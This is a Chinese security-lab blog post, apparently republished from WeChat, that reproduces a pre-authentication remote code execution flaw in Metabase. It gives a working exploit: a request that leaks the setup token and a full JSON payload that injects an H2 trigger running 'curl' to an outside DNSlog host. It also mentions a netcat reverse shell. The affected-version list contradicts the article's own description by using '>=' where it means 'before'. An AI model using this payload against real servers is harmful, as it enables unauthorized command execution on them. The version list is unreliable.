> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PUjrLI-IzBeDtZVXqpuDDg)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**  

Metabase 是美国 Metabase 公司的一个开源数据分析平台。Metabase 是一个开源的数据分析和可视化工具，它可以帮助用户轻松地连接到各种数据源，包括数据库、云服务和 API，然后使用直观的界面进行数据查询、分析和可视化。

Metabase 0.46.6.1 之前版本和 Metabase Enterprise 1.46.6.1 之前版本存在安全漏洞，该漏洞源于允许攻击者以服务器的权限级别在服务器上执行任意命令。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

Metabase open source >= 0.46.6.1

Metabase Enterprise >= 1.46.6.1

Metabase open source >= v0.45.4.1

Metabase Enterprise >= v1.45.4.1

Metabase open source >= v0.44.7.1

Metabase Enterprise >= v1.44.7.1

Metabase open source >= v0.43.7.2

Metabase Enterprise >= v1.43.7.2

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJob8VicToB6KddPOL95qhNQJLaOWr6c7lsiaME2Gymg1bFtVCm0wQkLyGYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJobRt0iam7MoRPzDEM14P0Rn3ZvqT0iaTZe5JzicNXaW9j7L9n6DvL8ohXQQ/640?wx_fmt=png)

2. 对漏洞进行复现

 **Poc1 （GET）**

```
GET /api/session/properties HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 812

```

GET 请求，响应存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJobvTrwZF0KINiceXe5rDNL02ib0LIicvc7GAyOoXEaUJ1Gv2umyRnNBrBCA/640?wx_fmt=png)

        前端显示

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJob99AFrUTJzxrf73vGZbcadicqqvOy46tuDnWKx0l0XuotGxMlEuwq0Ng/640?wx_fmt=png)

        DNSlog 生成测试域名

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJobnJa0Gu1EiaZDGS8Es3AIvEslsU1Y9111UYVLtfiaU3KUsyuUEKnjxCLg/640?wx_fmt=png)

POST 请求，响应存在漏洞，dnslog 域名测试

```
POST /api/setup/validate HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 812
{
    "token": "a50eb257-e56c-4dd8-b4ba-e67d7bc59261",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl r67caj.dnslog.cn')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJobh2JgZEtLO98wzicDgSjgQUznice2ZGNzzpeIxJe3thBJNokcXEM5A2ibQ/640?wx_fmt=png)

3. 反弹 shell 操作

nc 监听，反弹 shell

参考

[Apache Struts2--061 远程代码执行漏洞复现](https://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247486072&idx=1&sn=b7b1c04a72632ed5fd45bf2c59d51a11&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJobWuUeC5ibOZd198o4mnD599n3YKI9BXmCWMOUdeZr4CbTIpBy3zK92KA/640?wx_fmt=png)

4.x-poc 测试（漏洞存在）

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDUNVl60YzNIrPTp5YiaRJobUHYeky4FI9UJLEVJ2GpUpzHUqFLhyophEaktyBfgZJS43lO6ib3smWg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://www.metabase.com/blog/security-advisory
https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)